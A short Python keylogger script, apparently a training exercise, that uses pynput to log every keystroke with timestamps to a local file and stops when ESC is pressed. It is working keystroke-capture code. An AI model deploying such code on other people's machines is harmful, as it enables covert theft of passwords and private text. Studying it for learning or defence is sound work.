from pynput import keyboard
import os
import logging

# Configuration
LOG_FILE = r"C:\Users\revat\OneDrive\Desktop\skillcraft\keylog.txt"  # Specific path for the log file

# Ensure the directory exists
log_dir = os.path.dirname(LOG_FILE)
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Set up logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Global variable to store keystrokes
keystrokes = []

def log_key_to_file(key):
    """
    Appends the key to the keystrokes list and logs it to the file.
    """
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Printable character
            key_str = key.char
        else:
            # Special key (e.g., Shift, Enter, etc.)
            key_str = str(key)
        keystrokes.append(key_str)
        logging.info(f"Key logged: {key_str}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def on_press(key):
    """
    Callback function for key press events.
    """
    log_key_to_file(key)

def on_release(key):
    """
    Callback function for key release events.
    Terminates the listener when the ESC key is pressed.
    """
    if key == keyboard.Key.esc:
        logging.info("ESC pressed. Exiting the keylogger.")
        return False

# Main execution
if __name__ == "__main__":
    print(f"Keylogger is running. Logs are saved at {LOG_FILE}")
    
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()